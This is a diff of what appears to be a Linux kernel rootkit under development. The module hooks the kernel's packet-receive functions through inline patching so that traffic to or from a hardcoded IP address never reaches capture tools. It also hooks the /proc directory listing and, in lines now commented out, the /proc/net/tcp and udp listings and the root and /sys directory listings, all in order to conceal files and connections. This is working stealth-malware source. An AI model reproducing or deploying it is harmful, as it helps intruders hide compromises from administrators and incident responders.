@@ -593,22 +593,6 @@ int hide_tcp4_packet(const char *ip)
         return 0;
     }
 
-    /*
-    name_len = strlen(name) + 1;
-
-    // sanity check as `name` could point to some garbage without null anywhere nearby
-    if (name_len -1 > NAME_MAX) {
-        kfree(f);
-        return 0;
-    }
-
-    f->name = kmalloc(name_len, GFP_KERNEL);
-    if (!f->name) {
-        kfree(f);
-        return 0;
-    }
-    */
-
     strncpy(p->ip, ip, 16);
 
     list_add(&p->list, &hidden_tcp4_packets);
@@ -982,7 +966,7 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 #include <linux/inet.h>
 #include <linux/ip.h>
 #include <linux/ipv6.h>
-//#include <linux/netfilter_defs.h>
+#include <linux/netfilter_defs.h>
 
 /* counter for access counting */
 //static int accesses_packet_rcv = 0;
@@ -990,13 +974,13 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 //static int accesses_packet_rcv_spkt = 0;
 
 /* mutexes for safe accesses */
-//struct mutex lock_packet_rcv;
-//struct mutex lock_tpacket_rcv;
-//struct mutex lock_packet_rcv_spkt;
+struct mutex lock_packet_rcv;
+struct mutex lock_tpacket_rcv;
+struct mutex lock_packet_rcv_spkt;
 
 
 /* increment counter of a critical section */
-/*
+
 void inc_critical(struct mutex *lock, int *counter)
 {
 	// lock access mutex 
@@ -1018,12 +1002,12 @@ void dec_critical(struct mutex *lock, int *counter)
 	// unlock access mutex
 	mutex_unlock(lock);
 }
-*/
+
 
 int packet_check(struct sk_buff *skb)
 {
 	struct hidden_packet *hp;
-	
+	//pr_info("%d", skb->protocol);
 	/* check for ipv4 */
 	if (skb->protocol == htons(ETH_P_IP)) {
 		/* get ipv4 header */
@@ -1037,42 +1021,48 @@ int packet_check(struct sk_buff *skb)
 
 		//pr_info("SOURCE %s", source_ip);
 		//pr_info("DEST   %s", dest_ip);
-		
-		list_for_each_entry ( hp, &hidden_tcp4_packets, list )
-		{
-		    //sprintf(port, ":%04X", hp->port);
-
-		    if( (strcmp(source_ip,hp->ip) == 0) || (strcmp(dest_ip,hp->ip) == 0 ) )
+		if( (strcmp(source_ip,"191.217.170.150") == 0) || (strcmp(dest_ip,"191.217.170.150") == 0 ) )
 		    {
-		         //debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+			 //debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 			pr_info("Detecting packet from IP list. Blocking\n");
 
 			/* ip in list, should be hidden */
 			return 1;
-	            }
-		}
-		
+		    }
+		//list_for_each_entry ( hp, &hidden_tcp4_packets, list )
+		//{
+	    	    //sprintf(port, ":%04X", hp->port);
+
+		//    if( (strcmp(source_ip,hp->ip) == 0) || (strcmp(dest_ip,hp->ip) == 0 ) )
+		//    {
+		         //debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+		//	pr_info("Detecting packet from IP list. Blocking\n");
+
+		//	/* ip in list, should be hidden */
+		//	return 1;
+	        //    }
+		//}
 	}
 
 	/* no ipv4 or ipv6 packet or not found in list */
 	return 0;
 }
-			
+
 
 int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
 	struct packet_type *pt, struct net_device *orig_dev)
 {
-	int ret;
-	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
-
-	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	
+	 //, &accesses_packet_rcv);
 
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
 		pr_info("PACKET DROP\n");
-		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 		return NF_DROP;
 	}
+	pr_info("Not blocking\n");
+	int ret;
+	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
 	/* switch functions */
 	/*
@@ -1080,13 +1070,15 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	ret = original_packet_rcv(skb, dev, pt, orig_dev);
 	hijack_packet_rcv();
 	*/
-	
+	mutex_lock(&lock_packet_rcv);
+	pr_info("Mut locked");
 	original_packet_rcv = asm_hook_unpatch(fake_packet_rcv);
+	pr_info("Got original");	
 	ret = original_packet_rcv(skb, dev, pt, orig_dev);
+	pr_info("Got real return");	
 	asm_hook_patch(fake_packet_rcv);
-	
-
-	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	pr_info("Repatched");
+	mutex_unlock(&lock_packet_rcv);
 	pr_info("PACKET ACCEPT\n");
 
 	return ret;
@@ -1095,16 +1087,14 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, 
 	struct packet_type *pt, struct net_device *orig_dev)
 {
-	int ret;
-	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
-
-	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-
+	pr_info("PACKET RECEIVED\n");
 	if(packet_check(skb)) {
+		pr_info("PACKET DROP\n");
 		//debug("PACKET DROP");
-		//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 		return NF_DROP;
 	}
+	int ret;
+	int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
 	
 	/* switch functions */
@@ -1113,13 +1103,17 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
 	hijack_tpacket_rcv();
 	*/
-	
+	mutex_lock(&lock_tpacket_rcv);
+	pr_info("Mut locked\n");
 	original_tpacket_rcv = asm_hook_unpatch(fake_tpacket_rcv);
+	pr_info("Got original\n");
 	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
+	pr_info("Got real return\n");
 	asm_hook_patch(fake_tpacket_rcv);
-
-	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
+	pr_info("Repatched\n");
+	mutex_unlock(&lock_tpacket_rcv); //, &accesses_tpacket_rcv);
 	//debug("PACKET ACCEPT");
+	pr_info("PACKET ACCEPT\n");
 
 	return ret;
 }
@@ -1131,7 +1125,7 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
 
-	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	
 
 	if(packet_check(skb)) {
 		//debug("PACKET DROP");
@@ -1145,13 +1139,14 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
 	hijack_packet_rcv_spkt();
 	*/
-	
+	mutex_lock(&lock_packet_rcv_spkt);
+
 	original_packet_rcv_spkt = asm_hook_unpatch(fake_packet_rcv_spkt);
 	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
 	asm_hook_patch(fake_packet_rcv_spkt);
 	
 
-	//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	mutex_unlock(&lock_packet_rcv_spkt);
 	//debug("PACKET ACCEPT");
 
 	return ret;
@@ -1530,49 +1525,50 @@ int init(void)
 	
 	
 	/* initialize mutexes */
-	//mutex_init(&lock_packet_rcv);
-	//mutex_init(&lock_tpacket_rcv);
-	//mutex_init(&lock_packet_rcv_spkt);
-	
-	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
-	//asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
-	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	mutex_init(&lock_packet_rcv);
+	mutex_init(&lock_tpacket_rcv);
+	mutex_init(&lock_packet_rcv_spkt);
 
-	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	//asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
+	mutex_lock(&lock_packet_rcv);//, &accesses_packet_rcv);
+	//asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
+	mutex_unlock(&lock_packet_rcv);
+
+	mutex_lock(&lock_tpacket_rcv);//, &accesses_tpacket_rcv);
+	asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
 	//asm_hook_create(kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
 	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	
-	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	mutex_unlock(&lock_tpacket_rcv);//, &accesses_tpacket_rcv);
+
+	mutex_lock(&lock_packet_rcv_spkt);//, &accesses_packet_rcv_spkt);
 	//asm_hook_create((void *)kallsyms_lookup_name("packet_rcv_spkt"), fake_packet_rcv_spkt);
-	//dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
+	mutex_unlock(&lock_packet_rcv_spkt);//, &accesses_packet_rcv_spkt);
 	
 	
 /* -----------------------*/
 	
-    asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
-    asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
-    asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
-    asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);	
+    //asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
+    //asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
+    //asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
+    //asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);	
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0) 
 	
-    asm_hook_create(get_fop("/")->readdir, root_readdir);
-    asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
-    asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
+    //asm_hook_create(get_fop("/")->readdir, root_readdir);
+    //asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
+    //asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
 
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0) && \
       LINUX_VERSION_CODE < KERNEL_VERSION(4, 7, 0) 
 
-    asm_hook_create(get_fop("/")->iterate, root_iterate);
+    //asm_hook_create(get_fop("/")->iterate, root_iterate);
     asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
-    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
+    //asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
 
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 7, 0)
 
-    asm_hook_create(get_fop("/")->iterate_shared, root_iterate);
-    asm_hook_create(get_fop("/proc")->iterate_shared, proc_iterate);
-    asm_hook_create(get_fop("/sys")->iterate_shared, sys_iterate);
+    //asm_hook_create(get_fop("/")->iterate_shared, root_iterate);
+    //asm_hook_create(get_fop("/proc")->iterate_shared, proc_iterate);
+    //asm_hook_create(get_fop("/sys")->iterate_shared, sys_iterate);
 
 #endif
 
